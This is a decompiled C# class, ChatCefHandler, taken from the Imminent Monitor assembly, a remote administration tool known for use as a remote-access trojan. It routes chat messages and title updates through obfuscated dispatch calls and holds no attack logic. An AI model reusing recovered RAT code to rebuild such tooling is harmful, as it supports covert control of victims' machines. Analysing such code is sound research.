// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.ChatCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;

namespace ImminentMonitor.Cef
{
  public class ChatCefHandler
  {
    public FormChat Chat;

    public ChatCefHandler(FormChat chat) => this.Chat = chat;

    public void updateTitle() => this.Chat.Invoke((Delegate) (() => this.UpdateChatTitle()));

    public void sendMessage(string message)
    {
      ChatCefHandler chatCefHandler = this;
      this.Chat.Invoke((Delegate) (() => chatCefHandler.SendChatMessage(message)));
    }

    public void SendChatMessage(string message)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) message
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "9SJXnPa.Q$", object_3);
    }

    public void UpdateChatTitle()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), ",*\\7SPa.Q$", object_3);
    }
  }
}
